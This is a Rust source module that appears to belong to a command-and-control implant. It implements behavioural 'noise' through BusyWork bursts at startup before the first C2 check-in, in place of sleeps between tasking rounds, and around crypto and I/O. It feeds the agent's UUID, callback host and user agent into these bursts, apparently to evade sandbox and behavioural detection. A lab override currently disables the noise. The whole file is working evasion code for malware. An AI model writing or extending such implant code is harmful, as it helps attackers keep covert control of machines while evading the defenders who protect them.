use std::hint::black_box;
use crate::config;
use busywork::{BusyWork, Intensity, FeedWork};

/// Parsed busywork level. `"off"` / `"none"` skips computational delay entirely.
#[derive(Clone, Copy, PartialEq, Eq)]
enum Level {
    Off,
    Low,
    Medium,
    High,
    Ultra,
}

fn level() -> Level {
    // LAB: force off until tasking is proven stable under BusyWork.
    // Config is still stamped/logged; re-enable by removing this override.
    let _configured = config::busywork_intensity;
    Level::Off
}

fn to_intensity(l: Level) -> Option<Intensity> {
    match l {
        Level::Off => None,
        Level::Low => Some(Intensity::Low),
        Level::Medium => Some(Intensity::Medium),
        Level::High => Some(Intensity::High),
        Level::Ultra => Some(Intensity::Ultra),
    }
}

/// Brief computational noise before first C2 contact.
///
/// Capped at Low regardless of configured intensity — Ultra/Medium here used to
/// stall check-in for minutes and made lab debugging effectively impossible.
/// Full intensity still applies to `idle()` / `churn()` after the agent is live.
pub fn startup_delay() {
    let l = level();
    crate::dlog!(
        "startup_delay: configured={} (startup capped at low)",
        config::busywork_intensity
    );
    if l == Level::Off {
        crate::dlog!("startup_delay: skipped (off)");
        return;
    }
    let uuid = config::UUID.read().unwrap();
    black_box(
        BusyWork::new(Intensity::Low)
            .feed(uuid.as_str())
            .feed(config::callback_host)
            .feed(config::user_agent)
            .run(),
    );
    crate::dlog!("startup_delay: done");
}

/// Sleep replacement between tasking rounds.
pub fn idle() {
    let l = level();
    let Some(i) = to_intensity(l) else {
        std::thread::sleep(std::time::Duration::from_millis(200));
        return;
    };
    let uuid = config::UUID.read().unwrap();
    black_box(
        BusyWork::new(i)
            .feed(uuid.as_str())
            .feed(config::callback_host)
            .run(),
    );
    std::thread::sleep(std::time::Duration::from_millis(200));
    black_box(
        BusyWork::new(i)
            .feed(config::user_agent)
            .feed(uuid.as_str())
            .run(),
    );
    // Cap the third burst at High so Medium/Low builds stay responsive in lab.
    let third = match l {
        Level::Ultra | Level::High => Intensity::High,
        Level::Medium => Intensity::Medium,
        Level::Low => Intensity::Low,
        Level::Off => return,
    };
    std::thread::sleep(std::time::Duration::from_millis(200));
    black_box(
        BusyWork::new(third)
            .feed(config::callback_host)
            .feed(config::user_agent)
            .feed(uuid.as_str())
            .run(),
    );
}

/// Lightweight behavioral noise around crypto / I/O.
pub fn churn(data: &(impl FeedWork + ?Sized)) {
    let Some(i) = to_intensity(level()) else {
        return;
    };
    // Never churn harder than Medium — high churn after every op starves tasking.
    let i = match i {
        Intensity::High | Intensity::Ultra => Intensity::Medium,
        other => other,
    };
    black_box(BusyWork::new(i).feed(data).run());
}
